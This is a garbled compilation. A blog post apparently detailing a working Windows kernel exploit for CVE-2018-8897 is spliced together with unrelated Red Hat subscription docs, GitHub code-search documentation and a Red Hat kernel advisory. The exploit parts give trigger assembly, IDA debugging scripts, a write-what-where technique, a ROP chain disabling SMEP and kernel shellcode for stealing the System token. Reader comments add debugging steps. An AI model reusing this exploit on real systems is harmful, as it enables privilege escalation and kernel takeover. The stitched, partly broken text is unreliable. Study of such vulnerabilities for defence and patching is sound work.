  // Unroll nested KiBreakpointTrap -> KiDebugTrapOrFault -> KiTrapDebugOrFault
  while (

  {

    __rollback_isr( IsrStackIterator );

    // We are @ KiBreakpointTrap -> KiDebugTrapOrFault, which won't follow the RSP Delta
    if ( ( ( ISR_STACK* ) ( IsrStackIterator + 0x30 ) )->CS == 0x33 )
    {

      */
      IsrStackIterator = IsrStackIterator + 0x30;
      break;
    }

    IsrStackIterator -= StackDelta;
  }

  PVOID KStub = ( PVOID ) k_ExAllocatePool( 0ull, ( uint64_t )sizeof( IRetToVulnStub ) );
  Np_memcpy( KStub, IRetToVulnStub, sizeof( IRetToVulnStub ) );

  __swapgs();

  ( ( ISR_STACK* ) IsrStackIterator )->RIP += 1;
  ( fnIRetToVulnStub( KStub ) )( Cr4Old, IsrStackIterator, ContextBackup );
}
```

We can’t restore any registers so we will make the thread responsible for the execution of vulnerability store the context in a global container and restore from it instead. Now that we executed our code and returned to user-mode, our exploit is complete!

Let’s make a simple demo stealing the System token:

```
uint64_t SystemProcess = *k_PsInitialSystemProcess;
uint64_t CurrentProcess = k_PsGetCurrentProcess();

uint64_t CurrentToken = k_PsReferencePrimaryToken( CurrentProcess );

   The exploit may not work with certain hypervisors (like VMWare), which discard the pending #DB after INT3.

   How did you debug it by “simulating” this situation？

   Please share the debugging method.

      To simply put:

      1) Load unsigned kernel driver

      2) Allocate memory for new GS

      3) Set debug registers using \_\_writedr

      4) swapgs

      5) Set gs base

      6) Access the break pointed memory and raise a #DB

      7) Debug and Profit.

      Perhaps just stack alignment?

         Thank you. It is stack alignment. I just find it in Intel Manual 6.14.2 64-Bit Mode Stack Frame.

   Thanks for your answer.

   Finally, I debug your code in the following steps:

   1. Windbg Kernel debug: ba e1 KiDebugTrapService (I use INT 2D instead of INT 3)

   Simulate the #DB event which should be created by movss

   2. Then in IDA remote gdb(connected VMWare debug stub): set rip to skip notify windbg the #DB event

   But in this way, the REAL\_TIME watchdog thread was hard to get scheduled. When I force to set the context pointer to point to the kernel stack, I can run to the kernel shell code by ROP.

   Hi, bro! Your work is so good. i’m a newcomer to kernel exploit. I have some questions after reading your article.

   ONE. How to ,can u explain in more details?

   TWO. As im new to this area, what is the basic knowledge I need to prepare, do you have some good books or articles to recommand for me?

   I would appreciate for your precious reply.

      Hello, bro!

      I’m a newbee too. but I did some work about the CVE. I think maybe it is useful to you..

      <http://x86asm.net/articles/debugging-in-amd64-64-bit-mode-in-theory/> –> You could know some details about interrupts and exceptions, debug register. I think maybe you could read the article first. Because I think it is very useful.

      <https://www.bromium.com/dissecting-pop-ss-vulnerability/> –> You could get some details about the vulnerability…..I really think it is very useful…

      <https://github.com/nmulasmajic/CVE-2018-8897> –> POC from the finder.. I read it to know why the author know how to write EXP without any details..but I can’t.

      <http://everdox.net/popss.pdf> –> white paper.

      I’m sorry. My English is so terrible… ^\_^…….. .

   Hello, thanks for your work.!

   When I read your code from github, I could understand HANDLE(-2), I can’t understand that. The value must be -2?

   Maybe I’m not good at google…I can’t find any answer about the value “-2″….

   I’m sorry, my English is terrible…Looking forward to your reply!

      HANDLE(-2) is equal to GetCurrentThread() 🙂

         Hello, I’m sorry I always bother you…

         When I run your code. I find that that the instruction

         rdgsbase rax

         can’t work.(I run the instruction in windows 7(64bit) and I sure the mode is X64..)

         Then I run the instruction in windows 10(64bit), of course. The instruction work.

         And I want to find another instruction to replace it. so I read Ntoskrnl.exe. find the code in function which is named “PsGetCurrentProcess”

         .text:0000000140081D30 mov rax, gs:188h ; IoGetCurrentProcess

         .text:0000000140081D39 mov rax, [rax+70h]

         .text:0000000140081D3D retn

         I think maybe I can do something like this…

         lea rax, gs:188h(I know it won’t work… The instruction “mov rax, gs:00h” in visual won’t work too…)

         Could you give me some tips.. Thank you very much.

         And when I run your code. The code [i], [i+3],[i+7] , I think maybe it is lack of Versatility. I need to change the code like this and it will work.

         if (UPsGetCurrentProcess[i] == 0x48 && UPsGetCurrentProcess[i + 1] == 0x8B && // mov rax,

         UPsGetCurrentProcess[i + 4] == 0xC3) // retn

         {

         Offset\_KThread\_\_ApcStateFill\_\_Process = (0x70); //I find the offset is 0x70, so I change it directly.

         break;

         }

         Use number 4 instead of 7. I think have another method to run the code correctly in differcnt machines?

         I’m sorry….I try not to ask such a stupid question again.Thank U.

         I’m very sorry. I think maybe I get the answer from your github.

         “Discovered the problem while doing something completely unrelated, rdgsbase / wrgsbase is not supported in Windows 7 so this exploit will not work unless you overwrite TEB instead which is not what I’m doing in the PoC”

         I will try the mothods. Thank you!!!

## Environment considerations

Red Hat Enterprise Linux starting with versions 6.1 and 5.7 introduced a new Red Hat Subscription Management (RHSM) service. Red Hat Network (RHN) has been decommissioned.

Users that are new to Red Hat or would like the enhanced subscription information and improved content access should use RHSM. If you are still using Red Hat Network, we advise you to [migrate to RHSM as soon as possible](https://access.redhat.com/products/red-hat-subscription-management#migration). Customers using older versions of Red Hat Enterprise Linux must continue using RHN Classic. Refer to [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](https://access.redhat.com/articles/47844) and [What's the difference between management services provided by Red Hat Network (RHN) Classic and Red Hat Subscription Management (RHSM)?](https://access.redhat.com/articles/63269) for more information on benefits of RHSM over RHN.

* For **Red Hat Enterprise Linux 9**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 9](#rhel9).
* For **Red Hat Enterprise Linux 8**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 8](#rhel8).
* For **Red Hat Enterprise Linux 7**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 7](#rhel7).
* For **Red Hat Enterprise Linux 6**, register the system using RHSM (if RHEL 6.1 or above) as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 6](#rhel6).
* For **Red Hat Enterprise Linux 5**, register the system using RHSM (if RHEL 5.7 or above) as described in [Registering the system with the Subscription Manager](#rhsm). After registration, update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 5](#rhel5).
* If your system cannot connect to the Internet directly, our [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/) offering may be of interest.

## Prerequisites

### Registering the system with the Subscription Manager

#### Graphical interface

# Understanding GitHub Code Search syntax

You can build search queries for the results you want with specialized code qualifiers, regular expressions, and boolean operations.

## [About code search query structure](#about-code-search-query-structure)

The search syntax in this article only applies to searching code with GitHub code search. Note that the syntax and qualifiers for searching for non-code content, such as issues, users, and discussions, is not the same as the syntax for code search. For more information on non-code search, see [About searching on GitHub](/en/search-github/getting-started-with-searching-on-github/about-searching-on-github) and [Searching on GitHub](/en/search-github/searching-on-github).

Search queries consist of search terms, comprising text you want to search for, and qualifiers, which narrow down the search.

A bare term with no qualifiers will match either the content of a file or the file's path.

For example, the following query:

```
http-push

```

The above query will match the file `docs/http-push.txt`, even if it doesn't contain the term `http-push`. It will also match a file called `example.txt` if it contains the term `http-push`.

You can enter multiple terms separated by whitespace to search for documents that satisfy both terms.

For example, the following query:

```
sparse index

```

The search results would include all documents containing both the terms `sparse` and `index`, in any order. As examples, it would match a file containing `SparseIndexVector`, a file with the phrase `index for sparse trees`, and even a file named `index.txt` that contains the term `sparse`.

Searching for multiple terms separated by whitespace is the equivalent to the search `hello AND world`. Other boolean operations, such as `hello OR world`, are also supported. For more information about boolean operations, see [Using boolean operations](#using-boolean-operations).

Code search also supports searching for an exact string, including whitespace. For more information, see [Query for an exact match](#query-for-an-exact-match).

You can narrow your code search with specialized qualifiers, such as `repo:`, `language:` and `path:`. For more information on the qualifiers you can use in code search, see [Using qualifiers](#using-qualifiers).

You can also use regular expressions in your searches by surrounding the expression in slashes. For more information on using regular expressions, see [Using regular expressions](#using-regular-expressions).

## [Query for an exact match](#query-for-an-exact-match)

To search for an exact string, including whitespace, you can surround the string in quotes. For example:

```
"sparse index"

```

You can also use quoted strings in qualifiers, for example:

```
path:git language:"protocol buffers"

```
## [Searching for quotes and backslashes](#searching-for-quotes-and-backslashes)

To search for code containing a quotation mark, you can escape the quotation mark using a backslash. For example, to find the exact string `name = "tensorflow"`, you can search:

```
"name = \"tensorflow\""

```

To search for code containing a backslash, `\`, use a double backslash, `\\`.

The two escape sequences `\\` and `\"` can be used outside of quotes as well. No other escape sequences are recognized, though. A backslash that isn't followed by either `"` or `\` is included in the search, unchanged.

Additional escape sequences, such as `\n` to match a newline character, are supported in regular expressions. See [Using regular expressions](#using-regular-expressions).

## [Using boolean operations](#using-boolean-operations)

Code search supports boolean expressions. You can use the operators `AND`, `OR`, and `NOT` to combine search terms.

By default, adjacent terms separated by whitespace are equivalent to using the `AND` operator. For example, the search query `sparse index` is the same as `sparse AND index`, meaning that the search results will include all documents containing both the terms `sparse` and `index`, in any order.

To search for documents containing either one term or the other, you can use the `OR` operator. For example, the following query will match documents containing either `sparse` or `index`:

```
sparse OR index

```

To exclude files from your search results, you can use the `NOT` operator. For example, to exclude files in the `__testing__` directory, you can search:

```
"fatal error" NOT path:__testing__

```

You can use parentheses to express more complicated boolean expressions. For example:

```
(language:ruby OR language:python) AND NOT path:"/tests/"

```
## [Using qualifiers](#using-qualifiers)

You can use specialized keywords to qualify your search.

* [Repository qualifier](#repository-qualifier)
* [Organization and user qualifiers](#organization-and-user-qualifiers)
* [Language qualifier](#language-qualifier)
* [Path qualifier](#path-qualifier)
* [Symbol qualifier](#symbol-qualifier)
* [Content qualifier](#content-qualifier)
* [Is qualifier](#is-qualifier)

### [Repository qualifier](#repository-qualifier)

To search within a repository, use the `repo:` qualifier. You must provide the full repository name, including the owner. For example:

```
repo:github-linguist/linguist

```

To search within a set of repositories, you can combine multiple `repo:` qualifiers with the boolean operator `OR`. For example:

```
repo:github-linguist/linguist OR repo:tree-sitter/tree-sitter

```

Note

Code search does not currently support regular expressions or partial matching for repository names, so you will have to type the entire repository name (including the user prefix) for the `repo:` qualifier to work.

### [Organization and user qualifiers](#organization-and-user-qualifiers)

To search for files within an organization, use the `org:` qualifier. For example:

```
org:github

```

To search for files within a personal account, use the `user:` qualifier. For example:

```
user:octocat

```

Note

Code search does not currently support regular expressions or partial matching for organization or user names, so you will have to type the entire organization or user name for the qualifier to work.

### [Language qualifier](#language-qualifier)

To narrow down to a specific languages, use the `language:` qualifier. For example:

```
language:ruby OR language:cpp OR language:csharp

```

For a complete list of supported language names, see [languages.yaml](https://github.com/github-linguist/linguist/blob/main/lib/linguist/languages.yml) in [github-linguist/linguist](https://github.com/github-linguist/linguist). If your preferred language is not on the list, you can open a pull request to add it.

### [Path qualifier](#path-qualifier)

To search within file paths, use the `path:` qualifier. This will match files containing the term anywhere in their file path. For example, to find files containing the term `unit_tests` in their path, use:

```
path:unit_tests

```

The above query will match both `src/unit_tests/my_test.py` and `src/docs/unit_tests.md` since they both contain `unit_test` somewhere in their path.

To match only a specific filename (and not part of the path), you could use a regular expression:

```
path:/(^|\/)README\.md$/

```

Note that the `.` in the filename is escaped, since `.` has special meaning for regular expressions. For more information about using regular expressions, see [Using regular expressions](#using-regular-expressions).

You can also use some limited glob expressions in the `path:` qualifier.

For example, to search for files with the extension `txt`, you can use:

```
path:*.txt

```

To search for JavaScript files within a `src` directory, you could use:
```
path:src/*.js

```

* By default, glob expressions are not anchored to the start of the path, so the above expression would still match a path like `app/src/main.js`. But if you prefix the expression with `/`, it will anchor to the start. For example:

  ```
  path:/src/*.js

  ```
* Note that `*` doesn't match the `/` character, so for the above example, all results will be direct descendants of the `src` directory. To match within subdirectories, so that results include deeply nested files such as `/src/app/testing/utils/example.js`, you can use `**`. For example:

  ```
  path:/src/**/*.js

  ```

You can also use the `?` global character. For example, to match the path `file.aac` or `file.abc`, you can use:

```
path:*.a?c

```

To search for a filename which contains a special character like `\*` or `?`, just use a quoted string:
```
path:"file?"

```

Glob expressions are disabled for quoted strings, so the above query will only match paths containing the literal string `file?`.

### [Symbol qualifier](#symbol-qualifier)

You can search for symbol definitions in code, such as function or class definitions, using the `symbol:` qualifier. Symbol search is based on parsing your code using the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, so no extra setup or build tool integration is required.

For example, to search for a symbol called `WithContext`:

```
language:go symbol:WithContext

```

In some languages, you can search for symbols using a prefix (e.g. a prefix of their class name). For example, for a method `deleteRows` on a struct `Maint`, you could search `symbol:Maint.deleteRows` if you are using Go, or `symbol:Maint::deleteRows` in Rust.

You can also use regular expressions with the symbol qualifier. For example, the following query would find conversions people have implemented in Rust for the `String` type:

```
language:rust symbol:/^String::to_.*/

```

Note that this qualifier only searches for definitions and not references, and not all symbol types or languages are fully supported yet. Symbol extraction is supported for the following languages:

* Bash
* C
* C#
* C++
* CodeQL
* Elixir
* Go
* JSX
* Java
* JavaScript
* Lua
* PHP
* Protocol Buffers
* Python
* R
* Ruby
* Rust
* Scala
* Starlark
* Swift
* Typescript

We are working on adding support for more languages. If you would like to help contribute to this effort, you can add support for your language in the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, upon which symbol search is based.

### [Content qualifier](#content-qualifier)

By default, bare terms search both paths and file content. To restrict a search to strictly match the content of a file and not file paths, use the `content:` qualifier. For example:

```
content:README.md

```

This query would only match files containing the term `README.md`, rather than matching files named `README.md`.

### [Is qualifier](#is-qualifier)

To filter based on repository properties, you can use the `is:` qualifier. `is:` supports the following values:

* `archived`: restricts the search to archived repositories.
* `fork`: restricts the search to forked repositories.
* `vendored`: restricts the search to content detected as vendored.
* `generated`: restricts the search to content detected as generated.

For example:

```
path:/^MIT.txt$/ is:archived

```

Note that the `is:` qualifier can be inverted with the `NOT` operator. To search for non-archived repositories, you can search:

```
log4j NOT is:archived

```

To exclude forks from your results, you can search:

```
log4j NOT is:fork

```
## [Using regular expressions](#using-regular-expressions)

Code search supports regular expressions to search for patterns in your code. You can use regular expressions in bare search terms as well as within many qualifiers, by surrounding the regex in slashes.

For example, to search for the regular expression `sparse.*index`, you would use:

```
/sparse.*index/

```

Note that you'll have to escape any forward slashes within the regular expression. For example, to search for files within the `App/src` directory, you would use:

```
/^App\/src\//

```

Inside a regular expression, `\n` stands for a newline character, `\t` stands for a tab, and `\x{hhhh}` can be used to escape any Unicode character. This means you can use regular expressions to search for exact strings that contain characters that you can't type into the search bar.

Most common regular expressions features work in code search. However, "look-around" assertions are not supported.

## [Separating search terms](#separating-search-terms)

All parts of a search, such as search terms, exact strings, regular expressions, qualifiers, parentheses, and the boolean keywords `AND`, `OR`, and `NOT`, must be separated from one another with spaces. The one exception is that items inside parentheses, `(` `)`, don't need to be separated from the parentheses.

If your search contains multiple components that aren't separated by spaces, or other text that does not follow the rules listed above, code search will try to guess what you mean. It often falls back on treating that component of your query as the exact text to search for. For example, the following query:

```
printf("hello world\n");

```

Code search will give up on interpreting the parentheses and quotes as special characters and will instead search for files containing that exact code.

If code search guesses wrong, you can always get the search you wanted by using quotes and spaces to make the meaning clear.

## [Case sensitivity](#case-sensitivity)

By default, code search is case-insensitive, and results will include both uppercase and lowercase results. You can do case-sensitive searches by using a regular expression with case insensitivity turned off. For example, to search for the string "True", you would use:

```
/(?-i)True/

```

# RHSA-2018:1350 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Moderate: kernel security and bug fix update

## Type/Severity

Security Advisory: Moderate

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A1350)

## Topic

An update for kernel is now available for Red Hat Enterprise Linux 6.5 Advanced Update Support.

Red Hat Product Security has rated this update as having a security impact of Moderate. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

[Updated 10 May 2018]

The references to CVE-2017-5754 x86 (32-bit) mitigation were removed because Red Hat Enterprise Linux 6.5 Advanced Update Support does not include support for x86 32-bit architecture. Consequently, impact rating of this erratum was changed from Important to Moderate.

## Description

The kernel packages contain the Linux kernel, the core of any Linux operating system.

Security Fix(es):

* Kernel: error in exception handling leads to DoS (CVE-2018-8897)

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank Nick Peterson (Everdox Tech LLC) and Andy Lutomirski for reporting this issue.

Bug Fix(es):

* The kernel build requirements have been updated to the GNU Compiler Collection (GCC) compiler version that has the support for Retpolines. The Retpolines mechanism is a software construct that leverages specific knowledge of the underlying hardware to mitigate the branch target injection, also known as Spectre variant 2 vulnerability described in CVE-2017-5715. (BZ#1554256)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

The system must be rebooted for this update to take effect.

## Affected Products

* Red Hat Enterprise Linux Server - AUS 6.5 x86\_64

## Fixes

* [BZ - 1567074](https://bugzilla.redhat.com/show_bug.cgi?id=1567074)
  - CVE-2018-8897 Kernel: error in exception handling leads to DoS

At the end of the whitepaper they published on [triplefault.io](http://triplefault.io), they mentioned that they were able to load and execute unsigned kernel code, which got me interested in the challenge; and that’s exactly what I’m going to attempt doing in this post.

Before starting, I would like to note that this exploit may not work with certain hypervisors (like VMWare), which discard the pending #DB after INT3. I debugged it by “simulating” this situation.

*Final source code can be found at the bottom.*

# 0x0: Setting Up the Basics

The fundamentals of this exploit is really simple unlike the exploitation of it. When stack segment is changed –whether via MOV or POP– until the next instruction completes interrupts are deferred. This is not a microcode bug but rather a feature added by Intel so that stack segment and stack pointer can get set at the same time.

However, many OS vendors missed this detail, which lets us raise a #DB exception as if it comes from CPL0 from user-mode.

We can create a deferred-to-CPL0 exception by setting debug registers in such a way that during the execution of stack-segment changing instruction a #DB will raise and calling *int 3* right after. int 3 will jump to KiBreakpointTrap, and before the first instruction of KiBreakpointTrap executes, our #DB will be raised.

As it is mentioned by the everdox and 0xNemi in the original whitepaper, this lets us run a kernel-mode exception handler with our user-mode GSBASE. Debug registers and XMM registers will also be persisted.

All of this can be done in a few lines like shown below:

```
#include <Windows.h>
#include <iostream>

void main()
{
  static DWORD g_SavedSS = 0;

  _asm
  {
    mov ax, ss
    mov word ptr [ g_SavedSS ], ax
  }

  CONTEXT Ctx = { 0 };
  Ctx.Dr0 = ( DWORD ) &g_SavedSS;
  Ctx.Dr7 = ( 0b1 << 0 ) | ( 0b11 << 16 ) | ( 0b11 << 18 );
  Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
  SetThreadContext( HANDLE( -2 ), &Ctx );

  PVOID FakeGsBase = ...;

  _asm
  {
    mov eax, FakeGsBase                     ; Set eax to fake gs base

    push 0x23
    push X64_End
    push 0x33
    push X64_Start
    retf

    X64_Start:
    __emit 0xf3								             ; wrgsbase eax
    __emit 0x0f
    __emit 0xae
    __emit 0xd8
    retf
    X64_End:

    ; Vulnerability
    mov ss, word ptr [ g_SavedSS ]			    ; Defer debug exception
    int 3                           		    ; Execute with interrupts disabled
    nop
  }
}
```

*This example is 32-bit for the sake of showing ASM and C together, the final working code will be 64-bit.*

Now let’s start debugging, we are in **KiDebugTrapOrFault** with our custom GSBASE! However, this is nothing but catastrophic, almost no function works and we will end up in a KiDebugTrapOrFault->KiGeneralProtectionFault->KiPageFault->KiPageFault->… infinite loop. If we had a perfectly valid GSBASE, the outcome of what we achieved so far would be a KMODE\_EXCEPTION\_NOT\_HANDLED BSOD**,** so let’s focus on making GSBASE function like the real one and try to get to KeBugCheckEx.

We can utilize a small IDA script to step to relevant parts faster:

```
#include <idc.idc>

static main()
{
  Message( "--- Step Till Next GS ---\n" );

  while( 1 )
  {
    auto Disasm = GetDisasmEx( GetEventEa(), 1 );
    if ( strstr( Disasm, "gs:" ) >= Disasm )
      break;
    StepInto();
    GetDebuggerEvent( WFNE_SUSP, -1 );
  }
}
```
# 0x1: Fixing the KPCR Data

Here are the few cases we have to modify GSBASE contents to pass through successfully:

### – KiDebugTrapOrFault

```
KiDebugTrapOrFault:
...
MEMORY:FFFFF8018C20701E ldmxcsr dword ptr gs:180h
```

Pcr.Prcb.MxCsr needs to have a valid combination of flags to pass this instruction or else it will raise a #GP. So let’s set it to its initial value, 0x1F80.

### – KiExceptionDispatch

```
KiExceptionDispatch:
...
MEMORY:FFFFF8018C20DB5F mov     rax, gs:188h
MEMORY:FFFFF8018C20DB68 bt      dword ptr [rax+74h], 8
```

Pcr.Prcb.CurrentThread is what resides in gs:188h. We are going to allocate a block of memory and reference it in gs:188h.

### – KiDispatchException

```
KiDispatchException:
...
MEMORY:FFFFF8018C12A4D8 mov     rax, gs:qword_188
MEMORY:FFFFF8018C12A4E1 mov     rax, [rax+0B8h]
```

This is Pcr.Prcb.CurrentThread.ApcStateFill.Process and again we are going to allocate a block of memory and simply make this pointer point to it.

```
KeCopyLastBranchInformation:
...
MEMORY:FFFFF8018C12A0AC mov     rax, gs:qword_20
MEMORY:FFFFF8018C12A0B5 mov     ecx, [rax+148h]
```

0x20 from GSBASE is Pcr.CurrentPrcb, which is simply Pcr + 0x180. Let’s set Pcr.CurrentPrcb to Pcr + 0x180 and also set Pcr.Self to &Pcr while on it.

### – RtlDispatchException

This one is going to be a little bit more detailed. RtlDispatchException calls RtlpGetStackLimits, which calls KeQueryCurrentStackInformation and *\_\_fastfail*s if it fails. The problem here is that KeQueryCurrentStackInformation checks the current value of RSP against Pcr.Prcb.RspBase, Pcr.Prcb.CurrentThread->InitialStack, Pcr.Prcb.IsrStack and if it doesn’t find a match it reports failure. We obviously cannot know the value of kernel stack from user-mode, so what to do?

There’s a weird check in the middle of the function:

```
char __fastcall KeQueryCurrentStackInformation(_DWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  ...
  if ( *(_QWORD *)(*MK_FP(__GS__, 392i64) + 40i64) == *MK_FP(__GS__, 424i64) )
  {
    ...
  }
  else
  {
    *v5 = 5;
    result = 1;
    *v3 = 0xFFFFFFFFFFFFFFFFi64;
    *v4 = 0xFFFF800000000000i64;
  }
  return result;
}
```

Thanks to this check, as long as we make sure KThread.InitialStack (KThread + 0x28) is not equal to Pcr.Prcb.RspBase (gs:1A8h) KeQueryCurrentStackInformation will return success with 0xFFFF800000000000-0xFFFFFFFFFFFFFFFF as the reported stack range. Let’s go ahead and set Pcr.Prcb.RspBase to 1 and Pcr.Prcb.CurrentThread->InitialStack to 0. Problem solved.

RtlDispatchException after these changes will fail without bugchecking and return to KiDispatchException.

### – KeBugCheckEx

We are finally here. Here’s the last thing we need to fix:

```
MEMORY:FFFFF8018C1FB94A mov     rcx, gs:qword_20
MEMORY:FFFFF8018C1FB953 mov     rcx, [rcx+62C0h]
MEMORY:FFFFF8018C1FB95A call    RtlCaptureContext
```

Pcr.CurrentPrcb->Context is where KeBugCheck saves the context of the caller and for some weird reason, it is a PCONTEXT instead of a CONTEXT. We don’t really care about any other fields of Pcr so let’s just set it to Pcr+ 0x3000 just for the sake of having a valid pointer for now.

# 0x2:  and Write|What|Where

And there we go, sweet sweet blue screen of victory!

![KMODE_EXCEPTION_NOT_HANDLED](https://blog.can.ac/wp-content/uploads/2018/05/okrUD.png)

Now that everything works, how can we exploit it?

The code after KeBugCheckEx is too complex to step in one by one and it is most likely not-so-fun to revert from so let’s try NOT to bugcheck this time.

I wrote another IDA script to log the points of interest (such as gs: accesses and jumps and calls to registers and [registers+x]) and made it step until  KeBugCheckEx is hit:

```
#include <idc.idc>

static main()
{
  Message( "--- Logging Points of Interest ---\n" );

  while( 1 )
  {
    auto IP = GetEventEa();
    auto Disasm = GetDisasmEx( IP, 1 );

    if
    (
      ( strstr( Disasm, "gs:" ) >= Disasm ) ||
      ( strstr( Disasm, "jmp r" ) >= Disasm ) ||
      ( strstr( Disasm, "call r" ) >= Disasm ) ||
      ( strstr( Disasm, "jmp" ) >= Disasm && strstr( Disasm, "[r" ) >= Disasm ) ||
      ( strstr( Disasm, "call" ) >= Disasm && strstr( Disasm, "[r" ) >= Disasm )
    )
    {
    Message( "-- %s (+%x): %s\n", GetFunctionName( IP ), IP - GetFunctionAttr( IP, FUNCATTR_START ), Disasm );
    }

    StepInto();
    GetDebuggerEvent( WFNE_SUSP, -1 );

    if( IP == ... )
    break;
  }
}

```

To my disappointment, there is no convenient jumps or calls. The whole output is:

```
- KiDebugTrapOrFault (+3d):                   test    word ptr gs:278h, 40h
- sub_FFFFF8018C207019 (+5):                  ldmxcsr dword ptr gs:180h
-- KiExceptionDispatch (+5f):                 mov     rax, gs:188h
--- KiDispatchException (+48):                mov     rax, gs:188h
--- KiDispatchException (+5c):                inc     gs:5D30h
---- KeCopyLastBranchInformation (+38):       mov     rax, gs:20hh
---- KeQueryCurrentStackInformation (+3b):    mov     rax, gs:188h
---- KeQueryCurrentStackInformation (+44):    mov     rcx, gs:1A8h
--- KeBugCheckEx (+1a):                       mov     rcx, gs:20h
```

This means that we have to find a way to write to kernel-mode memory and abuse that instead. RtlCaptureContext will be a tremendous help here. As I mentioned before, it is taking the context pointer from Pcr.CurrentPrcb->Context, which is weirdly a **PCONTEXT Context** and not a **CONTEXT Context**, meaning we can supply it any kernel address and make it write the context over it.

I was originally going to make it write over g\_CiOptions and continuously NtLoadDriver in another thread, but this idea did not work as well as I thought (That being said, appearently this is the way [@0xNemi](https://twitter.com/0xNemi) and [@nickeverdox](https://twitter.com/nickeverdox) got it working. I guess we will see what dark magic they used at BlackHat 2018.) simply because the current thread is stuck in an infinite loop and the other thread trying to NtLoadDriver will not succeed because of the IPI it uses:

> NtLoadDriver->…->MiSetProtectionOnSection->KeFlushMultipleRangeTb->IPI->Deadlock

After playing around with g\_CiOptions for 1-2 days, I thought of a much better idea: overwriting the return address of RtlCaptureContext.

How are we going to overwrite the return address without having access to RSP? If we use a little bit of creativity, we actually can have access to RSP. We can get the current RSP by making Prcb.Context point to a user-mode memory and polling Context.RSP value from a secondary thread. Sadly, this is not useful by itself as we already passed RtlCaptureContext (our write what where exploit).

However, if we could return back to KiDebugTrapOrFault after RtlCaptureContext finishes its work and somehow predict the next value of RSP, this would be extremely abusable; which is exactly what we are going to do.

To return back to KiDebugTrapOrFault, we will again use our lovely debug registers. Right after RtlCaptureContext returns, a call to KiSaveProcessorControlState is made.

```
.text:000000014017595F                 mov     rcx, gs:20h
.text:0000000140175968                 add     rcx, 100h
.text:000000014017596F                 call    KiSaveProcessorControlState

.text:0000000140175C80 KiSaveProcessorControlState proc near   ; CODE XREF: KeBugCheckEx+3Fp

.text:0000000140175C80                 mov     rax, cr0

.text:0000000140175C86                 mov     rax, cr2
.text:0000000140175C89                 mov     [rcx+8], rax

.text:0000000140175C9F                 mov     [rcx+0A0h], rax
```

We will set DR1 on gs:20h + 0x100 + 0xA0, and make KeBugCheckEx return back to KiDebugTrapOrFault just after it saves the value of CR4.

To overwrite the return pointer, we will first let KiDebugTrapOrFault->…->RtlCaptureContext execute once giving our user-mode thread an initial RSP value, then we will let it execute another time to get the new RSP, which will let us calculate per-execution RSP difference. This RSP delta will be constant because the control flow is also constant.

Now that we have our RSP delta, we will predict the next value of RSP, subtract 8 from that to calculate the return pointer of RtlCaptureContext and make Prcb.Context->Xmm13 – Prcb.Context->Xmm15 written over it.

Thread logic will be like the following:

```
volatile PCONTEXT Ctx = *( volatile PCONTEXT* ) ( Prcb + Offset_Prcb__Context );

while ( !Ctx->Rsp );											                // Wait for RtlCaptureContext to be called once so we get leaked RSP
uint64_t StackInitial = Ctx->Rsp;
while ( Ctx->Rsp == StackInitial );								       // Wait for it to be called another time so we get the stack pointer difference
                                                          // between sequential KiDebugTrapOrFault
StackDelta = Ctx->Rsp - StackInitial;
PredictedNextRsp = Ctx->Rsp + StackDelta;						     // Predict next RSP value when RtlCaptureContext is called
uint64_t NextRetPtrStorage = PredictedNextRsp - 0x8;			// Predict where the return pointer will be located at
NextRetPtrStorage &= ~0xF;
*( uint64_t* ) ( Prcb + Offset_Prcb__Context ) = NextRetPtrStorage - Offset_Context__XMM13;
                                                          // Make RtlCaptureContext write XMM13-XMM15 over it
```

Now we simply need to set-up a ROP chain and write it to XMM13-XMM15. We cannot predict which half of XMM15 will get hit due to the mask we apply to comply with the movaps alignment requirement, so first two pointers should simply point at a [RETN] instruction.

We need to load a register with a value we choose to set CR4 so XMM14 will point at a [POP RCX; RETN] gadget, followed by a valid CR4 value with SMEP disabled. As for XMM13, we are simply going to use a [MOV CR4, RCX; RETN;] gadget followed by a pointer to our shellcode.

The final chain will look something like:

```
-- &retn;                (fffff80372e9502d)
-- &retn;                (fffff80372e9502d)
-- &pop rcx; retn;       (fffff80372ed9122)
-- cr4_nosmep            (00000000000506f8)
-- &mov cr4, rcx; retn;  (fffff803730045c7)
-- &KernelShellcode      (00007ff613fb1010)
```

In our shellcode, we will need to restore the CR4 value, swapgs, rollback ISR stack, execute the code we want and IRETQ back to user-mode which can be done like below:

```
NON_PAGED_DATA fnFreeCall k_ExAllocatePool = 0;

using fnIRetToVulnStub = void( * )  ( uint64_t Cr4, uint64_t IsrStack, PVOID ContextBackup );
NON_PAGED_DATA BYTE IRetToVulnStub[] =
{
  0x0F, 0x22, 0xE1,		// mov cr4, rcx ; cr4 = original cr4
  0x48, 0x89, 0xD4,		// mov rsp, rdx ; stack = isr stack
  0x4C, 0x89, 0xC1,		// mov rcx, r8  ; rcx = ContextBackup
  0xFB,				        // sti          ; enable interrupts
  0x48, 0xCF			     // iretq        ; interrupt return
};

NON_PAGED_CODE void KernelShellcode()
{
  __writedr( 7, 0 );

  uint64_t Cr4Old = __readgsqword( Offset_Pcr__Prcb + Offset_Prcb__Cr4 );
  __writecr4( Cr4Old & ~( 1 << 20 ) );

  __swapgs();

